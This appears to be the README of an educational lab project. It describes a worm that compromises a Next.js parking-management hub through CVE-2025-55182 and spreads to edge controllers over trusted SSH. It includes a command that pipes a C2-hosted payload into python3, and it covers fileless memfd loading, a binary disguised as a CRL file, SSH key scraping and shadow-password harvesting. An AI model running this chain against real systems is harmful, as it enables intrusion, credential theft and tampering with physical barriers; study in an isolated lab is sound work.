# B(D)SM

**A  Worm Implementation Targeting Parking Management Systems (PMS)**

> **⚠️ DISCLAIMER:** This project is created for **academic and educational purposes only**. The vulnerabilities and malware techniques demonstrated here are performed in a closed, isolated laboratory environment. Unauthorized use of these techniques against systems you do not own is illegal.

-----

## 📖 Scenario Overview

**B(D)SM** is a modern smart-parking provider using a distributed "Hub-and-Spoke" architecture.

  * **The Hub:** A centralized web portal (Next.js) for user parking management and online bookings.
  * **The Spokes:** Isolated edge controllers located physically at parking garages.

**🎯 The Objective:**
Compromise the public-facing Hub, deploy a **worm** that pivots to the isolated Spoke via trusted SSH channels, and override the physical barrier.

-----

## 🏗️ Architecture

The lab environment is fully containerized using Docker Compose.

| Service | Hostname | Tech Stack | Role | Vulnerability |
| :--- | :--- | :--- | :--- | :--- |
| **Attacker** | `attacker` | Kali Linux | Operator | - |
| **C2 Server** | `c2` | Python Slim | Infrastructure | - |
| **The Hub** | `pms_central` | Next.js + Python | **Target 1** | **CVE-2025-55182 (React2Shell)** |
| **The Spoke(s)** | `pms_local_N` | SSH Server | **Target 2** | Trusted SSH Relationship + **CVE-2025–32463** |

-----

## 🚀 Installation & Setup

### Prerequisites

  * Docker & Docker Compose
  * Linux/Mac host (recommended)

### 1\. Clone & Initialize

```bash
git clone https://github.com/your-username/pms-worm.git
cd pms-worm

# Generate the SSH keys for the Trust Relationship abuse
chmod +x setup.sh
./setup.sh
```

### 2\. Build the Infrastructure

```bash
# Build the images (Attacker, C2, Hub, Spoke)
docker-compose build

# Start the lab
docker-compose up -d
```

### 3\. Compile the Malware (Attacker Side)

You need to compile the C-Worm and package it into the fileless dropper.

```bash
# Enter the attacker
cd attacker/worm

# 1. Compile the static binary
gcc -static -s worm.c -o worm

# 2. Build the Fileless Dropper (Generates revoke.crl)
python3 build_dropper.py

# 3. move revoke.crl to C2
mv -f revoke.crl ../c2/public/revoke.crl
```

-----

## ⚔️ The Kill Chain (Walkthrough)

### Phase 1: Initial Access (React2Shell)

We exploit a deserialization vulnerability in the Next.js App Router (CVE-2025-55182).

  * **Vector:** HTTP Request to the public portal.
  * **Technique:** We inject a command to download our "Certificate Revocation List" (`revoke.crl`).
  * **Command:** `./exploit-redirect.sh http://localhost:3000 "curl -s http://c2:8080/public/revoke.crl | grep -v '^-----' | base64 -d | python3"`

### Phase 2: Defense Evasion (Fileless Loading)

The payload is not a script, but a **static C binary** disguised as a Base64 CRL file.

  * **Obfuscation:** The binary is Zlib-compressed and Base64-encoded inside standard PEM headers.
  * **Execution:** The exploit pipes the CRL content directly into Python's `stdin`.
  * **Technique:** The Python loader uses `memfd_create` (Syscall 319 in x86_64 and 279 in aarch64) to write the binary to a "Ghost File" in RAM and executes it via `os.execv`. **No file is written to the Hub's disk.**

### Phase 3: Lateral Movement (SSH Trust)

The worm, now running in the Hub's memory, scans for the internal network.

  * **Discovery:** It finds the different spokes.
  * **Credential Access:** It scrapes `/home/<user>/.ssh/id_rsa`.
  * **Propagation:** It uses **SSH Piping** to stream its own binary code (read from `/proc/self/exe`) directly into the disk of the Spoke (`/tmp/worm`).

### Phase 4: Privilege Escalation

  * **Technique:** TODO.

### Phase 5: Post-exploitation

  * **Credentials Harvesting:** The worm scrapes shadow passwords from the Spoke's environment.
  * **Exfiltration:** TODO.
  * **The End:** TODO.

-----

## 📂 Project Structure

```text
pms-worm/
├── attacker/               # 
|   ├── c2/                 # C2 Server
|   ├── iac/                # Exploit for Initial Access (CVE-2025-55182)
|   └── worm/               # The C Malware Source
├── keys/                   # Generated keys
├── pms-client/             # The Spoke
├── pms-server/             # The Hub
├── docker-compose.yml      # Lab Orchestration
├── setup.sh                # Key generator for Hub-Spoke SSH channel
└── verify.sh               # Verifies spokes are inffected
```